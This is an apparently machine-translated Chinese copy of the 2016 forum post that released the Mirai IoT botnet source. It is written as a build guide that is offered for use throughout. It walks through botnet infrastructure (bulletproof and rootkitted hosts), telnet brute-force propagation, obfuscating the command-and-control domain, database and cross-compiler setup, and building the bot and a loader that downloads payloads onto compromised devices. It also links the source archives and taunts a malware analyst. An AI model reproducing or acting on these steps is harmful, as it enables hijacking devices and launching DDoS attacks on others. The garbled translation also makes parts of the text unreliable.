*原始引自：[Anna-senpai]（https://hackforums.net/showthread.php?tid=5420472）
*发布日期：2016年9月30日星期五19:50:52
* [请参阅原始存档的帖子]（ForumPost.txt）

＃ 前言

大家好，

当我第一次进入DDoS行业时，我并没有打算长期待在该行业中。 一世
赚了我的钱，现在有很多人在关注物联网，所以现在该到GTFO了。
但是，我知道每个滑道和他们的妈妈，拥有它们是他们的梦dream以求的
qbot以外的东西。

所以今天，我为您提供了一个了不起的版本。 对于Mirai，我通常最多可拉380k
仅来自telnet的漫游器。 但是，在Kreb DDoS之后，ISP逐渐关闭
并清理他们的行为。 如今，最大拉动能力约为30万个机器人
下降。

所以，我是你的senpai，我会很好的对待你，我的高频议员。

对于认为自己通过攻击我的CNC做任何事情的每个人，我都有
好笑，这个机器人使用域进行CNC。 所有漫游器需要60秒
重新连接，大声笑

另外，请由malustmustdie大声疾呼此博客文章

* http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
* https://web.archive.org/web/20160930230210/http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html
  <-备份，以防低质量的逆向工程师unixfreaxjp决定编辑他的
  大声笑

十分尊重您，以为您是优秀的反向器，但是您
实际上，完全无法完全反转该二进制文件。 “我们还是
比你的孩子有更好的功夫”请不要让我笑，你这样做
许多错误，甚至与我混淆了一些不同的二进制文件。大声笑

我再打耳光-

1.端口“ 48101”不用于反向连接，用于控制以防止多个
   机器人一起运行的实例
2.`/ dev / watchdog`和`/ dev / misc`不是为了“延迟”，而是为了
   防止系统挂起。这是一个低落的果实，让我很难过
   你真傻
3.您失败了，并认为`FAKE_CNC_ADDR`和`FAKE_CNC_PORT`是真正的CNC，大声笑
   “并且正在通过65.222.202.53上的HTTP进行后门连接”。你得到了
   被信号流绊倒了;）尝试更努力
4.您的骨架工具糟透了，它认为攻击解码器是“罪恶的”
   样式”，但它甚至不使用基于文本的协议？CNC和bot
   通过二进制协议进行通信
5.您说“ chroot（“ /”）像torlus一样可预测，但您不了解，
   其他一些则基于CWD杀死。它显示了您对真实情况的了解如何
   恶意软件。回到斯基德兰

给你5巴掌

为什么要编写逆向工程工具？您甚至无法正确地反转
第一名。在尝试打动别人之前，请先学习一些技巧。
在以愚蠢的功夫宣言宣告如何“击败我”时表现出的傲慢自大
吃东西的时候让我笑得那么难，所以不得不拍打我的背。

就像我永远自由一样，您将永远注定要实行军国统治。

＃ 要求

###裸机最低

2个服务器：1个用于CNC + mysql，1个用于扫描接收器，1个用于加载

###专业设置（我的设置）

2个VPS和4个服务器

* 1个VPS，具有极为防弹的主机，可用于数据库服务器
* 1个VPS，rootkitted，用于scanReceiver和Distribution
* 1个用于CNC的服务器（使用2％CPU和40万个机器人）
* 3个10gbps NForce服务器用于加载（分发服务器分发到3个服务器
  一样）


＃基础架构概述

*为了建立与CNC的连接，机器人必须解析一个域
  （[[resolv.c`]（mirai / bot / resolv.c）/ [`resolv.h`]（mirai / bot / resolv.h））和
  连接到该IP地址
*使用先进的SYN扫描器使暴力破解telnet机器人快80倍，
  qbot中的一个，使用的资源几乎减少了20倍。当发现残酷时
  结果，漫游器解析了另一个域并报告了该域。这被链接到一个
  单独的服务器，以在结果输入时自动加载到设备上。
*粗糙的结果默认情况下通过端口48101发送。该实用程序名为
  工具中的scanListen.go用于接收残酷的结果（我正在四处走走
  高峰时每秒500次Bruted结果）。如果以调试模式构建，则应
  请参见utitlity scanListen二进制文件出现在debug文件夹中。

Mirai使用类似于self-rep的传播机制，但我称之为
“实时加载”。基本上，机器人将结果蛮干，将其发送到服务器进行侦听
使用`scanListen`实用程序，它将结果发送到加载程序。这个循环
（`brute-> scanListen-> load-> brute`）被称为实时加载。

加载程序可以配置为使用多个IP地址绕过端口
linux中的耗尽（可用端口数量有限，这意味着
元组的变化不足以同时获得超过65k
出站连接-理论上，此值要少得多）。我大概有60k-
70k同时出站连接（同时加载）分布在5个IP。

＃配置机器人

Bot有多个配置选项，这些配置选项在table.c / table.h中被混淆了。
在[`./mirai/bot/table.h`](mirai/bot/table.h）中，您可以找到有关
配置选项。但是，在[`./mirai/bot/table.c`](mirai/bot/table.c）中
您需要更改一些选项才能开始工作。

*`TABLE_CNC_DOMAIN`-要连接的CNC域名-非常避免DDoS
  mirai很有趣，人们尝试攻击我的CNC，但是我更新的速度比他们想的要快
  找到新的IP，大声笑。迟到:)
*`TABLE_CNC_PORT`-要连接的端口，已经设置为23
*`TABLE_SCAN_CB_DOMAIN`-查找残破结果时，此域是
  报告给
*`TABLE_SCAN_CB_PORT`-用于连接结果的端口，设置为
  已经是48101。

在[`./mirai/tools`](mirai/tools）中，您会找到一个叫做enc.c的东西-您
必须将其编译以输出要放入table.c文件中的内容

在mirai目录中运行此文件

    ./build.sh调试telnet

如果您有交叉编译器不在的话，将会得到一些错误
没有配置它们。可以，不会影响enc工具的编译

现在，在`。/ mirai / debug`文件夹中，您应该看到一个名为enc的编译二进制文件。
例如，要获取机器人要连接的域名的混淆字符串，
用这个：

    ./debug/enc字符串fuck.the.police.com

输出应如下所示

    XOR'ing 20个字节的数据...
    \ x44 \ x57 \ x41 \ x49 \ x0C \ x56 \ x4A \ x47 \ x0C \ x52 \ x4D \ x4E \ x4B \ x41 \ x47 \ x0C \ x41 \ x4D \ x4F \ x22

例如，要更新“ TABLE_CNC_DOMAIN”值，请替换该长十六进制字符串
与enc工具提供的工具一起使用。此外，您还会看到对20个字节的数据进行“异或”处理。
此值必须很好地替换最后一个参数。例如，table.c
最初看起来像这样

    add_entry（TABLE_CNC_DOMAIN，“ \ x41 \ x4C \ x41 \ x0C \ x41 \ x4A \ x43 \ x4C \ x45 \ x47 \ x4F \ x47 \ x0C \ x41 \ x4D \ x4F \ x22”，30）； // cnc.changeme.com

现在我们知道了enc工具的价值，我们就这样更新它

    add_entry（TABLE_CNC_DOMAIN，“ \ x44 \ x57 \ x41 \ x49 \ x0C \ x56 \ x4A \ x47 \ x0C \ x52 \ x4D \ x4E \ x4B \ x41 \ x47 \ x0C \ x41 \ x4D \ x4F \ x22”，20）； // fuck.the.police.com

有些值是字符串，有些是端口（网络顺序为uint16 /大端优先）。

＃配置CNC

    apt-get install mysql-server mysql-client

CNC需要数据库才能工作。安装数据库时，进入数据库并运行
以下命令：http://pastebin.com/86d0iL9g（参考：
[`db.sql`]（scripts / db.sql））

这将为您创建数据库。要添加您的用户，

    插入用户值（NULL，'anna-senpai'，'myawesomepassword'，0，0，0，0，-1，1，30，''）;

现在，进入文件[`./mirai/cnc/main.go`](mirai/cnc/main.go）

编辑这些值

    const DatabaseAddr字符串=“ 127.0.0.1”
    const DatabaseUser字符串=“ root”
    const DatabasePass字符串=“密码”
    const DatabaseTable字符串=“ mirai”

有关刚刚安装的mysql服务器的信息


＃设置交叉编译器

交叉编译器很容易，请按照此链接上的说明进行设置。您
必须重新启动系统或重新加载.bashrc文件，以使这些更改生效
影响。

http://pastebin.com/1rRCc3aD（参考：
[`cross-compile.sh`]（scripts / cross-compile.sh））

＃建立CNC + Bot

CNC，机器人和相关工具：

1. http://santasbigcandycane.cx/mirai.src.zip-*这些链接不会持久
  永久，最多2周-备份！* <br>
  ！[mirai.src.zip内容]（scripts / images / BVc7qJs.png）
2. http://santasbigcandycane.cx/loader.src.zip-*这些链接不会持久
   永久，最多2周-备份！*
   
###如何构建机器人+ CNC

在mirai文件夹中，有[`build.sh`]（mirai / build.sh）脚本。

    ./build.sh调试telnet

将输出不会进行守护进程的bot调试二进制文件并输出信息
关于它是否可以连接到CNC等，洪水状态等。
`。/ mirai / debug`文件夹

    ./build.sh发行telnet

将输出非常剥离的小型机器人的生产就绪二进制文件
（大约60K）应加载到设备上。以以下格式编译所有二进制文件：
将``mirai。$ ARCH''复制到`。/ mirai / release`文件夹


＃构建echo loader

加载程序以下列格式从STDIN读取telnet条目：

    ip：port用户：pass

它检测是否存在wget或tftp，并尝试使用以下命令下载二进制文件
那。如果没有，它将回显一个很小的二进制文件（大约1kb），足以满足
wget。

    ./build.sh

将构建loader，优化，生产使用，大惊小怪。如果您有文件
用于加载的格式，您可以执行此操作

    cat file.txt | ./loader

记住要`ulimit`！

显然，我没有提供任何一对一的帮助教程或狗屎，
太多时间。所有脚本和所有内容均已包括在内，以设置可运行的僵尸网络
在1小时内。如果您有任何疑问，我很乐意提供帮助（如何
CNC没有连接到数据库，我这样做是这个（等等），但不是
诸如“我的机器人无法连接，对其进行修复”之类的问题
